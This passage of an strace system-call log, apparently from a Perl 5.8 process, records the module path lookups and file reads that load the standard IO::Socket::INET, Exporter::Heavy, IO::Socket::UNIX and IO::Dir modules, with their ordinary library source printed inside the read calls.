6823  07:15:42.850915 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/INET.pm", 0xbf80cc6c) = -1 ENOENT (No such file or directory)
6823  07:15:42.850932 stat64("/usr/local/share/perl/5.8.8/IO/Socket/INET.pmc", 0xbf80cd5c) = -1 ENOENT (No such file or directory)
6823  07:15:42.850974 stat64("/usr/local/share/perl/5.8.8/IO/Socket/INET.pm", 0xbf80cc6c) = -1 ENOENT (No such file or directory)
6823  07:15:42.851005 stat64("/usr/lib/perl5/IO/Socket/INET.pmc", 0xbf80cd5c) = -1 ENOENT (No such file or directory)
6823  07:15:42.851018 stat64("/usr/lib/perl5/IO/Socket/INET.pm", 0xbf80cc6c) = -1 ENOENT (No such file or directory)
6823  07:15:42.851032 stat64("/usr/share/perl5/IO/Socket/INET.pmc", 0xbf80cd5c) = -1 ENOENT (No such file or directory)
6823  07:15:42.851045 stat64("/usr/share/perl5/IO/Socket/INET.pm", 0xbf80cc6c) = -1 ENOENT (No such file or directory)
6823  07:15:42.851059 stat64("/usr/lib/perl/5.8/IO/Socket/INET.pmc", 0xbf80cd5c) = -1 ENOENT (No such file or directory)
6823  07:15:42.851072 stat64("/usr/lib/perl/5.8/IO/Socket/INET.pm", {st_mode=S_IFREG|0644, st_size=6497, ...}) = 0
6823  07:15:42.851094 open("/usr/lib/perl/5.8/IO/Socket/INET.pm", O_RDONLY|O_LARGEFILE) = 6
6823  07:15:42.851110 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf80ca78) = -1 ENOTTY (Inappropriate ioctl for device)
6823  07:15:42.851121 _llseek(6, 0, [0], SEEK_CUR) = 0
6823  07:15:42.851139 read(6, "# IO::Socket::INET.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket::INET;\n\nuse strict;\nour(@ISA, $VERSION);\nuse IO::Socket;\nuse Socket;\nuse Carp;\nuse Exporter;\nuse Errno;\n\n@ISA = qw(IO::Socket);\n$VERSION = \"1.29\";\n\nmy $EINVAL = exists(&Errno::EINVAL) ? Errno::EINVAL() : 1;\n\nIO::Socket::INET->register_domain( AF_INET );\n\nmy %socket_type = ( tcp  => SOCK_STREAM,\n\t\t    udp  => SOCK_DGRAM,\n\t\t    icmp => SOCK_RAW\n\t\t  );\n\nsub new {\n    my $class = shift;\n    unshift(@_, \"PeerAddr\") if @_ == 1;\n    return $class->SUPER::new(@_);\n}\n\nsub _sock_info {\n  my($addr,$port,$proto) = @_;\n  my $origport = $port;\n  my @proto = ();\n  my @serv = ();\n\n  $port = $1\n\tif(defined $addr && $addr =~ s,:([\\w\\(\\)/]+)$,,);\n\n  if(defined $proto  && $proto =~ /\\D/) {\n    if(@proto = getprotobyname($proto)) {\n      $proto = $proto[2] || undef;\n    }\n    else {\n      $@ = \"Bad protocol \'$proto\'\";\n      return;\n    }\n  }\n\n  if(defined $port) {\n    my $defport = ($port =~ s,\\((\\d+)\\)$,,) ? $1 : undef;\n    my $pnum = ($port =~ m,^(\\d+)$,)[0];\n\n    @serv = getservbyname($port, $proto[0] || \"\")\n\tif ($port =~ m,\\D,);\n\n    $port = $serv[2] || $defport || $pnum;\n    unless (defined $port) {\n\t$@ = \"Bad service \'$origport\'\";\n\treturn;\n    }\n\n    $proto = (getprotobyname($serv[3]))[2] || undef\n\tif @serv && !$proto;\n  }\n\n return ($addr || undef,\n\t $port || undef,\n\t $proto || undef\n\t);\n}\n\nsub _error {\n    my $sock = shift;\n    my $err = shift;\n    {\n      local($!);\n      my $title = ref($sock).\": \";\n      $@ = join(\"\", $_[0] =~ /^$title/ ? \"\" : $title, @_);\n      close($sock)\n\tif(defined fileno($sock));\n    }\n    $! = $err;\n    return undef;\n}\n\nsub _get_addr {\n    my($sock,$addr_str, $multi) = @_;\n    my @addr;\n    if ($multi && $addr_str !~ /^\\d+(?:\\.\\d+){3}$/) {\n\t(undef, undef, undef, undef, @addr) = gethostbyname($addr_str);\n    } else {\n\tmy $h = inet_aton($addr_str);\n\tpush(@addr, $h) if defined $h;\n    }\n    @addr;\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    my($lport,$rport,$laddr,$raddr,$proto,$type);\n\n    $arg->{LocalAddr} = $arg->{LocalHost}\n\tif exists $arg->{LocalHost} && !exists $arg->{LocalAddr};\n\n    ($laddr,$lport,$proto) = _sock_info($arg->{LocalAddr},\n\t\t\t\t\t$arg->{LocalPort},\n\t\t\t\t\t$arg->{Proto})\n\t\t\tor return _error($sock, $!, $@);\n\n    $laddr = defined $laddr ? inet_aton($laddr)\n\t\t\t    : INADDR_ANY;\n\n    return _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{LocalAddr},\"\'\")\n\tunless(defined $laddr);\n\n    $arg->{PeerAddr} = $arg->{PeerHost}\n\tif exists $arg->{PeerHost} && !exists $arg->{PeerAddr};\n\n    unless(exists $arg->{Listen}) {\n\t($raddr,$rport,$proto) = _sock_info($arg->{PeerAddr},\n\t\t\t\t\t    $arg->{PeerPort},\n\t\t\t\t\t    $proto)\n\t\t\tor return _error($sock, $!, $@);\n    }\n\n    $proto ||= (getprotobyname(\'tcp\'))[2];\n\n    my $pname = (getprotobynumber($proto))[0];\n    $type = $arg->{Type} || $socket_type{lc $pname};\n\n    my @raddr = ();\n\n    if(defined $raddr) {\n\t@raddr = $sock->_get_addr($raddr, $arg->{MultiHomed});\n\treturn _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{PeerAddr},\"\'\")\n\t    unless @raddr;\n    }\n\n    while(1) {\n\n\t$sock->socket(AF_INET, $type, $proto) or\n\t    return _error($sock, $!, \"$!\");\n\n        if (defined $arg->{Blocking}) {\n\t    defined $sock->blocking($arg->{Blocking})\n\t\tor return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{Reuse} || $arg->{ReuseAddr}) {\n\t    $sock->sockopt(SO_REUSEADDR,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{ReusePort}) {\n\t    $sock->sockopt(SO_REUSEPORT,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{Broadcast}) {\n\t\t$sock->sockopt(SO_BROADCAST,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif($lport || ($laddr ne INADDR_ANY) || exists $arg->{Listen}) {\n\t    $sock->bind($lport || 0, $laddr) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif(exists $arg->{Listen}) {\n\t    $sock->listen($arg->{Listen} || 5) or\n\t\treturn _error($sock, $!, \"$!\");\n\t    last;\n\t}\n\n \t# don\'t try to connect unless we\'re given a PeerAddr\n \tlast unless e", 4096) = 4096
6823  07:15:42.851492 stat64("/etc/perl/Exporter/Heavy.pmc", 0xbf80c8ac) = -1 ENOENT (No such file or directory)
6823  07:15:42.851509 stat64("/etc/perl/Exporter/Heavy.pm", 0xbf80c7bc) = -1 ENOENT (No such file or directory)
6823  07:15:42.851524 stat64("/usr/local/lib/perl/5.8.8/Exporter/Heavy.pmc", 0xbf80c8ac) = -1 ENOENT (No such file or directory)
6823  07:15:42.851540 stat64("/usr/local/lib/perl/5.8.8/Exporter/Heavy.pm", 0xbf80c7bc) = -1 ENOENT (No such file or directory)
6823  07:15:42.851555 stat64("/usr/local/share/perl/5.8.8/Exporter/Heavy.pmc", 0xbf80c8ac) = -1 ENOENT (No such file or directory)
6823  07:15:42.851568 stat64("/usr/local/share/perl/5.8.8/Exporter/Heavy.pm", 0xbf80c7bc) = -1 ENOENT (No such file or directory)
6823  07:15:42.851583 stat64("/usr/lib/perl5/Exporter/Heavy.pmc", 0xbf80c8ac) = -1 ENOENT (No such file or directory)
6823  07:15:42.851595 stat64("/usr/lib/perl5/Exporter/Heavy.pm", 0xbf80c7bc) = -1 ENOENT (No such file or directory)
6823  07:15:42.851609 stat64("/usr/share/perl5/Exporter/Heavy.pmc", 0xbf80c8ac) = -1 ENOENT (No such file or directory)
6823  07:15:42.851622 stat64("/usr/share/perl5/Exporter/Heavy.pm", 0xbf80c7bc) = -1 ENOENT (No such file or directory)
6823  07:15:42.851636 stat64("/usr/lib/perl/5.8/Exporter/Heavy.pmc", 0xbf80c8ac) = -1 ENOENT (No such file or directory)
6823  07:15:42.851649 stat64("/usr/lib/perl/5.8/Exporter/Heavy.pm", 0xbf80c7bc) = -1 ENOENT (No such file or directory)
6823  07:15:42.851663 stat64("/usr/share/perl/5.8/Exporter/Heavy.pmc", 0xbf80c8ac) = -1 ENOENT (No such file or directory)
6823  07:15:42.851677 stat64("/usr/share/perl/5.8/Exporter/Heavy.pm", {st_mode=S_IFREG|0644, st_size=6252, ...}) = 0
6823  07:15:42.851699 open("/usr/share/perl/5.8/Exporter/Heavy.pm", O_RDONLY|O_LARGEFILE) = 8
6823  07:15:42.851714 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf80c5c8) = -1 ENOTTY (Inappropriate ioctl for device)
6823  07:15:42.851725 _llseek(8, 0, [0], SEEK_CUR) = 0
6823  07:15:42.851743 read(8, "package Exporter::Heavy;\n\nuse strict;\nno strict \'refs\';\n\n# On one line so MakeMaker will see it.\nrequire Exporter;  our $VERSION = $Exporter::VERSION;\n$Carp::Internal{\"Exporter::Heavy\"} = 1;\n\n#\n# We go to a lot of trouble not to \'require Carp\' at file scope,\n#  because Carp requires Exporter, and something has to give.\n#\n\nsub _rebuild_cache {\n    my ($pkg, $exports, $cache) = @_;\n    s/^&// foreach @$exports;\n    @{$cache}{@$exports} = (1) x @$exports;\n    my $ok = \\@{\"${pkg}::EXPORT_OK\"};\n    if (@$ok) {\n\ts/^&// foreach @$ok;\n\t@{$cache}{@$ok} = (1) x @$ok;\n    }\n}\n\nsub heavy_export {\n\n    # First make import warnings look like they\'re coming from the \"use\".\n    local $SIG{__WARN__} = sub {\n\tmy $text = shift;\n\tif ($text =~ s/ at \\S*Exporter\\S*.pm line \\d+.*\\n//) {\n\t    require Carp;\n\t    local $Carp::CarpLevel = 1;\t# ignore package calling us too.\n\t    Carp::carp($text);\n\t}\n\telse {\n\t    warn $text;\n\t}\n    };\n    local $SIG{__DIE__} = sub {\n\trequire Carp;\n\tlocal $Carp::CarpLevel = 1;\t# ignore package calling us too.\n\tCarp::croak(\"$_[0]Illegal null symbol in \\@${1}::EXPORT\")\n\t    if $_[0] =~ /^Unable to create sub named \"(.*?)::\"/;\n    };\n\n    my($pkg, $callpkg, @imports) = @_;\n    my($type, $sym, $cache_is_current, $oops);\n    my($exports, $export_cache) = (\\@{\"${pkg}::EXPORT\"},\n                                   $Exporter::Cache{$pkg} ||= {});\n\n    if (@imports) {\n\tif (!%$export_cache) {\n\t    _rebuild_cache ($pkg, $exports, $export_cache);\n\t    $cache_is_current = 1;\n\t}\n\n\tif (grep m{^[/!:]}, @imports) {\n\t    my $tagsref = \\%{\"${pkg}::EXPORT_TAGS\"};\n\t    my $tagdata;\n\t    my %imports;\n\t    my($remove, $spec, @names, @allexports);\n\t    # negated first item implies starting with default set:\n\t    unshift @imports, \':DEFAULT\' if $imports[0] =~ m/^!/;\n\t    foreach $spec (@imports){\n\t\t$remove = $spec =~ s/^!//;\n\n\t\tif ($spec =~ s/^://){\n\t\t    if ($spec eq \'DEFAULT\'){\n\t\t\t@names = @$exports;\n\t\t    }\n\t\t    elsif ($tagdata = $tagsref->{$spec}) {\n\t\t\t@names = @$tagdata;\n\t\t    }\n\t\t    else {\n\t\t\twarn qq[\"$spec\" is not defined in %${pkg}::EXPORT_TAGS];\n\t\t\t++$oops;\n\t\t\tnext;\n\t\t    }\n\t\t}\n\t\telsif ($spec =~ m:^/(.*)/$:){\n\t\t    my $patn = $1;\n\t\t    @allexports = keys %$export_cache unless @allexports; # only do keys once\n\t\t    @names = grep(/$patn/, @allexports); # not anchored by default\n\t\t}\n\t\telse {\n\t\t    @names = ($spec); # is a normal symbol name\n\t\t}\n\n\t\twarn \"Import \".($remove ? \"del\":\"add\").\": @names \"\n\t\t    if $Exporter::Verbose;\n\n\t\tif ($remove) {\n\t\t   foreach $sym (@names) { delete $imports{$sym} } \n\t\t}\n\t\telse {\n\t\t    @imports{@names} = (1) x @names;\n\t\t}\n\t    }\n\t    @imports = keys %imports;\n\t}\n\n        my @carp;\n\tforeach $sym (@imports) {\n\t    if (!$export_cache->{$sym}) {\n\t\tif ($sym =~ m/^\\d/) {\n\t\t    $pkg->VERSION($sym); # inherit from UNIVERSAL\n\t\t    # If the version number was the only thing specified\n\t\t    # then we should act as if nothing was specified:\n\t\t    if (@imports == 1) {\n\t\t\t@imports = @$exports;\n\t\t\tlast;\n\t\t    }\n\t\t    # We need a way to emulate \'use Foo ()\' but still\n\t\t    # allow an easy version check: \"use Foo 1.23, \'\'\";\n\t\t    if (@imports == 2 and !$imports[1]) {\n\t\t\t@imports = ();\n\t\t\tlast;\n\t\t    }\n\t\t} elsif ($sym !~ s/^&// || !$export_cache->{$sym}) {\n\t\t    # Last chance - see if they\'ve updated EXPORT_OK since we\n\t\t    # cached it.\n\n\t\t    unless ($cache_is_current) {\n\t\t\t%$export_cache = ();\n\t\t\t_rebuild_cache ($pkg, $exports, $export_cache);\n\t\t\t$cache_is_current = 1;\n\t\t    }\n\n\t\t    if (!$export_cache->{$sym}) {\n\t\t\t# accumulate the non-exports\n\t\t\tpush @carp,\n\t\t\t  qq[\"$sym\" is not exported by the $pkg module\\n];\n\t\t\t$oops++;\n\t\t    }\n\t\t}\n\t    }\n\t}\n\tif ($oops) {\n\t    require Carp;\n\t    Carp::croak(\"@{carp}Can\'t continue after import errors\");\n\t}\n    }\n    else {\n\t@imports = @$exports;\n    }\n\n    my($fail, $fail_cache) = (\\@{\"${pkg}::EXPORT_FAIL\"},\n                              $Exporter::FailCache{$pkg} ||= {});\n\n    if (@$fail) {\n\tif (!%$fail_cache) {\n\t    # Build cache of symbols. Optimise the lookup by adding\n\t    # barewords twice... both with and without a leading &.\n\t    # (Technique could be applied to $export_cac", 4096) = 4096
6823  07:15:42.852483 read(8, "he at cost of memory)\n\t    my @expanded = map { /^\\w/ ? ($_, \'&\'.$_) : $_ } @$fail;\n\t    warn \"${pkg}::EXPORT_FAIL cached: @expanded\" if $Exporter::Verbose;\n\t    @{$fail_cache}{@expanded} = (1) x @expanded;\n\t}\n\tmy @failed;\n\tforeach $sym (@imports) { push(@failed, $sym) if $fail_cache->{$sym} }\n\tif (@failed) {\n\t    @failed = $pkg->export_fail(@failed);\n\t    foreach $sym (@failed) {\n                require Carp;\n\t\tCarp::carp(qq[\"$sym\" is not implemented by the $pkg module ],\n\t\t\t\"on this architecture\");\n\t    }\n\t    if (@failed) {\n\t\trequire Carp;\n\t\tCarp::croak(\"Can\'t continue after import errors\");\n\t    }\n\t}\n    }\n\n    warn \"Importing into $callpkg from $pkg: \",\n\t\tjoin(\", \",sort @imports) if $Exporter::Verbose;\n\n    foreach $sym (@imports) {\n\t# shortcut for the common case of no type character\n\t(*{\"${callpkg}::$sym\"} = \\&{\"${pkg}::$sym\"}, next)\n\t    unless $sym =~ s/^(\\W)//;\n\t$type = $1;\n\t*{\"${callpkg}::$sym\"} =\n\t    $type eq \'&\' ? \\&{\"${pkg}::$sym\"} :\n\t    $type eq \'$\' ? \\${\"${pkg}::$sym\"} :\n\t    $type eq \'@\' ? \\@{\"${pkg}::$sym\"} :\n\t    $type eq \'%\' ? \\%{\"${pkg}::$sym\"} :\n\t    $type eq \'*\' ?  *{\"${pkg}::$sym\"} :\n\t    do { require Carp; Carp::croak(\"Can\'t export symbol: $type$sym\") };\n    }\n}\n\nsub heavy_export_to_level\n{\n      my $pkg = shift;\n      my $level = shift;\n      (undef) = shift;\t\t\t# XXX redundant arg\n      my $callpkg = caller($level);\n      $pkg->export($callpkg, @_);\n}\n\n# Utility functions\n\nsub _push_tags {\n    my($pkg, $var, $syms) = @_;\n    my @nontag = ();\n    my $export_tags = \\%{\"${pkg}::EXPORT_TAGS\"};\n    push(@{\"${pkg}::$var\"},\n\tmap { $export_tags->{$_} ? @{$export_tags->{$_}} \n                                 : scalar(push(@nontag,$_),$_) }\n\t\t(@$syms) ? @$syms : keys %$export_tags);\n    if (@nontag and $^W) {\n\t# This may change to a die one day\n\trequire Carp;\n\tCarp::carp(join(\", \", @nontag).\" are not tags of $pkg\");\n    }\n}\n\nsub heavy_require_version {\n    my($self, $wanted) = @_;\n    my $pkg = ref $self || $self;\n    return ${pkg}->VERSION($wanted);\n}\n\nsub heavy_export_tags {\n  _push_tags((caller)[0], \"EXPORT\",    \\@_);\n}\n\nsub heavy_export_ok_tags {\n  _push_tags((caller)[0], \"EXPORT_OK\", \\@_);\n}\n\n1;\n", 4096) = 2156
6823  07:15:42.852711 brk(0x829c000)    = 0x829c000
6823  07:15:42.852981 read(8, "", 4096) = 0
6823  07:15:42.852997 close(8)          = 0
6823  07:15:42.854055 read(6, "xists($arg->{PeerAddr});\n \n        $raddr = shift @raddr;\n\n\treturn _error($sock, $EINVAL, \'Cannot determine remote port\')\n\t\tunless($rport || $type == SOCK_DGRAM || $type == SOCK_RAW);\n\n\tlast\n\t    unless($type == SOCK_STREAM || defined $raddr);\n\n\treturn _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{PeerAddr},\"\'\")\n\t    unless defined $raddr;\n\n#        my $timeout = ${*$sock}{\'io_socket_timeout\'};\n#        my $before = time() if $timeout;\n\n\tundef $@;\n        if ($sock->connect(pack_sockaddr_in($rport, $raddr))) {\n#            ${*$sock}{\'io_socket_timeout\'} = $timeout;\n            return $sock;\n        }\n\n\treturn _error($sock, $!, $@ || \"Timeout\")\n\t    unless @raddr;\n\n#\tif ($timeout) {\n#\t    my $new_timeout = $timeout - (time() - $before);\n#\t    return _error($sock,\n#                         (exists(&Errno::ETIMEDOUT) ? Errno::ETIMEDOUT() : $EINVAL),\n#                         \"Timeout\") if $new_timeout <= 0;\n#\t    ${*$sock}{\'io_socket_timeout\'} = $new_timeout;\n#        }\n\n    }\n\n    $sock;\n}\n\nsub connect {\n    @_ == 2 || @_ == 3 or\n       croak \'usage: $sock->connect(NAME) or $sock->connect(PORT, ADDR)\';\n    my $sock = shift;\n    return $sock->SUPER::connect(@_ == 1 ? shift : pack_sockaddr_in(@_));\n}\n\nsub bind {\n    @_ == 2 || @_ == 3 or\n       croak \'usage: $sock->bind(NAME) or $sock->bind(PORT, ADDR)\';\n    my $sock = shift;\n    return $sock->SUPER::bind(@_ == 1 ? shift : pack_sockaddr_in(@_))\n}\n\nsub sockaddr {\n    @_ == 1 or croak \'usage: $sock->sockaddr()\';\n    my($sock) = @_;\n    my $name = $sock->sockname;\n    $name ? (sockaddr_in($name))[1] : undef;\n}\n\nsub sockport {\n    @_ == 1 or croak \'usage: $sock->sockport()\';\n    my($sock) = @_;\n    my $name = $sock->sockname;\n    $name ? (sockaddr_in($name))[0] : undef;\n}\n\nsub sockhost {\n    @_ == 1 or croak \'usage: $sock->sockhost()\';\n    my($sock) = @_;\n    my $addr = $sock->sockaddr;\n    $addr ? inet_ntoa($addr) : undef;\n}\n\nsub peeraddr {\n    @_ == 1 or croak \'usage: $sock->peeraddr()\';\n    my($sock) = @_;\n    my $name = $sock->peername;\n    $name ? (sockaddr_in($name))[1] : undef;\n}\n\nsub peerport {\n    @_ == 1 or croak \'usage: $sock->peerport()\';\n    my($sock) = @_;\n    my $name = $sock->peername;\n    $name ? (sockaddr_in($name))[0] : undef;\n}\n\nsub peerhost {\n    @_ == 1 or croak \'usage: $sock->peerhost()\';\n    my($sock) = @_;\n    my $addr = $sock->peeraddr;\n    $addr ? inet_ntoa($addr) : undef;\n}\n\n1;\n\n__END__\n\n", 4096) = 2401
6823  07:15:42.854441 _llseek(6, 6496, [6496], SEEK_SET) = 0
6823  07:15:42.854459 _llseek(6, 0, [6496], SEEK_CUR) = 0
6823  07:15:42.854470 close(6)          = 0
6823  07:15:42.854530 stat64("/etc/perl/IO/Socket/UNIX.pmc", 0xbf80cd5c) = -1 ENOENT (No such file or directory)
6823  07:15:42.854547 stat64("/etc/perl/IO/Socket/UNIX.pm", 0xbf80cc6c) = -1 ENOENT (No such file or directory)
6823  07:15:42.854562 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/UNIX.pmc", 0xbf80cd5c) = -1 ENOENT (No such file or directory)
6823  07:15:42.854575 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/UNIX.pm", 0xbf80cc6c) = -1 ENOENT (No such file or directory)
6823  07:15:42.854590 stat64("/usr/local/share/perl/5.8.8/IO/Socket/UNIX.pmc", 0xbf80cd5c) = -1 ENOENT (No such file or directory)
6823  07:15:42.854603 stat64("/usr/local/share/perl/5.8.8/IO/Socket/UNIX.pm", 0xbf80cc6c) = -1 ENOENT (No such file or directory)
6823  07:15:42.854618 stat64("/usr/lib/perl5/IO/Socket/UNIX.pmc", 0xbf80cd5c) = -1 ENOENT (No such file or directory)
6823  07:15:42.854635 stat64("/usr/lib/perl5/IO/Socket/UNIX.pm", 0xbf80cc6c) = -1 ENOENT (No such file or directory)
6823  07:15:42.854649 stat64("/usr/share/perl5/IO/Socket/UNIX.pmc", 0xbf80cd5c) = -1 ENOENT (No such file or directory)
6823  07:15:42.854661 stat64("/usr/share/perl5/IO/Socket/UNIX.pm", 0xbf80cc6c) = -1 ENOENT (No such file or directory)
6823  07:15:42.854675 stat64("/usr/lib/perl/5.8/IO/Socket/UNIX.pmc", 0xbf80cd5c) = -1 ENOENT (No such file or directory)
6823  07:15:42.854689 stat64("/usr/lib/perl/5.8/IO/Socket/UNIX.pm", {st_mode=S_IFREG|0644, st_size=1387, ...}) = 0
6823  07:15:42.854711 open("/usr/lib/perl/5.8/IO/Socket/UNIX.pm", O_RDONLY|O_LARGEFILE) = 6
6823  07:15:42.854727 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf80ca78) = -1 ENOTTY (Inappropriate ioctl for device)
6823  07:15:42.854739 _llseek(6, 0, [0], SEEK_CUR) = 0
6823  07:15:42.854755 brk(0x82bd000)    = 0x82bd000
6823  07:15:42.857450 read(6, "# IO::Socket::UNIX.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket::UNIX;\n\nuse strict;\nour(@ISA, $VERSION);\nuse IO::Socket;\nuse Socket;\nuse Carp;\n\n@ISA = qw(IO::Socket);\n$VERSION = \"1.22\";\n$VERSION = eval $VERSION;\n\nIO::Socket::UNIX->register_domain( AF_UNIX );\n\nsub new {\n    my $class = shift;\n    unshift(@_, \"Peer\") if @_ == 1;\n    return $class->SUPER::new(@_);\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    my($bport,$cport);\n\n    my $type = $arg->{Type} || SOCK_STREAM;\n\n    $sock->socket(AF_UNIX, $type, 0) or\n\treturn undef;\n\n    if(exists $arg->{Local}) {\n\tmy $addr = sockaddr_un($arg->{Local});\n\t$sock->bind($addr) or\n\t    return undef;\n    }\n    if(exists $arg->{Listen} && $type != SOCK_DGRAM) {\n\t$sock->listen($arg->{Listen} || 5) or\n\t    return undef;\n    }\n    elsif(exists $arg->{Peer}) {\n\tmy $addr = sockaddr_un($arg->{Peer});\n\t$sock->connect($addr) or\n\t    return undef;\n    }\n\n    $sock;\n}\n\nsub hostpath {\n    @_ == 1 or croak \'usage: $sock->hostpath()\';\n    my $n = $_[0]->sockname || return undef;\n    (sockaddr_un($n))[0];\n}\n\nsub peerpath {\n    @_ == 1 or croak \'usage: $sock->peerpath()\';\n    my $n = $_[0]->peername || return undef;\n    (sockaddr_un($n))[0];\n}\n\n1; # Keep require happy\n\n__END__\n\n", 4096) = 1387
6823  07:15:42.858206 _llseek(6, 1386, [1386], SEEK_SET) = 0
6823  07:15:42.858206 _llseek(6, 0, [1386], SEEK_CUR) = 0
6823  07:15:42.858206 close(6)          = 0
6823  07:15:42.858206 stat64("/etc/perl/IO/Dir.pmc", 0xbf80cd5c) = -1 ENOENT (No such file or directory)
6823  07:15:42.858207 stat64("/etc/perl/IO/Dir.pm", 0xbf80cc6c) = -1 ENOENT (No such file or directory)
6823  07:15:42.858207 stat64("/usr/local/lib/perl/5.8.8/IO/Dir.pmc", 0xbf80cd5c) = -1 ENOENT (No such file or directory)
6823  07:15:42.858207 stat64("/usr/local/lib/perl/5.8.8/IO/Dir.pm", 0xbf80cc6c) = -1 ENOENT (No such file or directory)
6823  07:15:42.858216 stat64("/usr/local/share/perl/5.8.8/IO/Dir.pmc", 0xbf80cd5c) = -1 ENOENT (No such file or directory)
6823  07:15:42.858229 stat64("/usr/local/share/perl/5.8.8/IO/Dir.pm", 0xbf80cc6c) = -1 ENOENT (No such file or directory)
6823  07:15:42.858243 stat64("/usr/lib/perl5/IO/Dir.pmc", 0xbf80cd5c) = -1 ENOENT (No such file or directory)
6823  07:15:42.858254 stat64("/usr/lib/perl5/IO/Dir.pm", 0xbf80cc6c) = -1 ENOENT (No such file or directory)
6823  07:15:42.858268 stat64("/usr/share/perl5/IO/Dir.pmc", 0xbf80cd5c) = -1 ENOENT (No such file or directory)
6823  07:15:42.858279 stat64("/usr/share/perl5/IO/Dir.pm", 0xbf80cc6c) = -1 ENOENT (No such file or directory)
6823  07:15:42.858292 stat64("/usr/lib/perl/5.8/IO/Dir.pmc", 0xbf80cd5c) = -1 ENOENT (No such file or directory)
6823  07:15:42.858305 stat64("/usr/lib/perl/5.8/IO/Dir.pm", {st_mode=S_IFREG|0644, st_size=5318, ...}) = 0
6823  07:15:42.858326 open("/usr/lib/perl/5.8/IO/Dir.pm", O_RDONLY|O_LARGEFILE) = 6
6823  07:15:42.858344 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf80ca78) = -1 ENOTTY (Inappropriate ioctl for device)
6823  07:15:42.858356 _llseek(6, 0, [0], SEEK_CUR) = 0
6823  07:15:42.858375 read(6, "# IO::Dir.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Dir;\n\nuse 5.006;\n\nuse strict;\nuse Carp;\nuse Symbol;\nuse Exporter;\nuse IO::File;\nour(@ISA, $VERSION, @EXPORT_OK);\nuse Tie::Hash;\nuse File::stat;\nuse File::Spec;\n\n@ISA = qw(Tie::Hash Exporter);\n$VERSION = \"1.05\";\n$VERSION = eval $VERSION;\n@EXPORT_OK = qw(DIR_UNLINK);\n\nsub DIR_UNLINK () { 1 }\n\nsub new {\n    @_ >= 1 && @_ <= 2 or croak \'usage: new IO::Dir [DIRNAME]\';\n    my $class = shift;\n    my $dh = gensym;\n    if (@_) {\n\tIO::Dir::open($dh, $_[0])\n\t    or return undef;\n    }\n    bless $dh, $class;\n}\n\nsub DESTROY {\n    my ($dh) = @_;\n    closedir($dh);\n}\n\nsub open {\n    @_ == 2 or croak \'usage: $dh->open(DIRNAME)\';\n    my ($dh, $dirname) = @_;\n    return undef\n\tunless opendir($dh, $dirname);\n    # a dir name should always have a \":\" in it; assume dirname is\n    # in current directory\n    $dirname = \':\' .  $dirname if ( ($^O eq \'MacOS\') && ($dirname !~ /:/) );\n    ${*$dh}{io_dir_path} = $dirname;\n    1;\n}\n\nsub close {\n    @_ == 1 or croak \'usage: $dh->close()\';\n    my ($dh) = @_;\n    closedir($dh);\n}\n\nsub read {\n    @_ == 1 or croak \'usage: $dh->read()\';\n    my ($dh) = @_;\n    readdir($dh);\n}\n\nsub seek {\n    @_ == 2 or croak \'usage: $dh->seek(POS)\';\n    my ($dh,$pos) = @_;\n    seekdir($dh,$pos);\n}\n\nsub tell {\n    @_ == 1 or croak \'usage: $dh->tell()\';\n    my ($dh) = @_;\n    telldir($dh);\n}\n\nsub rewind {\n    @_ == 1 or croak \'usage: $dh->rewind()\';\n    my ($dh) = @_;\n    rewinddir($dh);\n}\n\nsub TIEHASH {\n    my($class,$dir,$options) = @_;\n\n    my $dh = $class->new($dir)\n\tor return undef;\n\n    $options ||= 0;\n\n    ${*$dh}{io_dir_unlink} = $options & DIR_UNLINK;\n    $dh;\n}\n\nsub FIRSTKEY {\n    my($dh) = @_;\n    $dh->rewind;\n    scalar $dh->read;\n}\n\nsub NEXTKEY {\n    my($dh) = @_;\n    scalar $dh->read;\n}\n\nsub EXISTS {\n    my($dh,$key) = @_;\n    -e File::Spec->catfile(${*$dh}{io_dir_path}, $key);\n}\n\nsub FETCH {\n    my($dh,$key) = @_;\n    &lstat(File::Spec->catfile(${*$dh}{io_dir_path}, $key));\n}\n\nsub STORE {\n    my($dh,$key,$data) = @_;\n    my($atime,$mtime) = ref($data) ? @$data : ($data,$data);\n    my $file = File::Spec->catfile(${*$dh}{io_dir_path}, $key);\n    unless(-e $file) {\n\tmy $io = IO::File->new($file,O_CREAT | O_RDWR);\n\t$io->close if $io;\n    }\n    utime($atime,$mtime, $file);\n}\n\nsub DELETE {\n    my($dh,$key) = @_;\n\n    # Only unlink if unlink-ing is enabled\n    return 0\n\tunless ${*$dh}{io_dir_unlink};\n\n    my $file = File::Spec->catfile(${*$dh}{io_dir_path}, $key);\n\n    -d $file\n\t? rmdir($file)\n\t: unlink($file);\n}\n\n1;\n\n__END__\n\n=head1 NAME \n\nIO::Dir - supply object methods for directory handles\n\n=head1 SYNOPSIS\n\n    use IO::Dir;\n    $d = IO::Dir->new(\".\");\n    if (defined $d) {\n        while (defined($_ = $d->read)) { something($_); }\n        $d->rewind;\n        while (defined($_ = $d->read)) { something_else($_); }\n        undef $d;\n    }\n\n    tie %dir, \'IO::Dir\', 